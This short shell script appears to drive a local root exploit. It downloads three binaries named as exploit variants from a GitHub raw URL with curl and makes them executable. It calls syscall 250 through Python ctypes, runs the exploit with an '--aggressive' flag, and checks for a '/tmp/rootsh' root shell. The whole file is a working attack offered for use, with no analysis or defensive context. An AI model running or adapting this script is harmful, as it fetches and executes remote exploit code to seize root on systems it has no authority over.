#!/bin/sh
cd /tmp/rt || exit 1
# ensure binaries
for b in e_def e_wide e_ms; do [ -x $b ] || curl -sL -m 90 -o $b "https://raw.githubusercontent.com/rpkl122/bbh-rt/main/exploit$( [ $b = e_def ] && echo '' || echo -${b#e_} )"; chmod +x $b 2>/dev/null; done
echo "=== single attempt with own prefetch (KPTI off) ==="
python3 -c "import ctypes;l=ctypes.CDLL(None);[l.syscall(250,7,ctypes.c_ulong(r)) for r in (-2,-3,-4,-5)]" 2>/dev/null
./e_def --aggressive 2>&1 | tail -20
echo "---rootsh---"
ls -la /tmp/rootsh 2>&1
